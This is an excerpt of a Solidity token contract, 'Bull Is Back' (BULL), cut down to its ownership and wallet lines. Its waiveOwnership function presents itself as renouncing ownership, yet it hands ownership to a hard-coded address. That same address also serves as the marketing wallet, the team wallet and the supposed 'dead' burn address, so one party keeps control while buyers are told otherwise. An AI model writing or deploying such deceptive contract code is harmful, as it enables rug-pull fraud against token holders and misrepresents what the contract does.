...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xE4814c0e5cfe7df52Af24F2CE60bFc4A7720ed9A));
        _owner = address(0xE4814c0e5cfe7df52Af24F2CE60bFc4A7720ed9A);
    }
...
contract BullIsBack  is Context, IERC20, Ownable {
    ...
    string private _name = "Bull Is Back";
    string private _symbol = "BULL";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xE4814c0e5cfe7df52Af24F2CE60bFc4A7720ed9A);
    address payable public teamWalletAddress = payable(0xE4814c0e5cfe7df52Af24F2CE60bFc4A7720ed9A);
    address public immutable deadAddress = 0xE4814c0e5cfe7df52Af24F2CE60bFc4A7720ed9A;
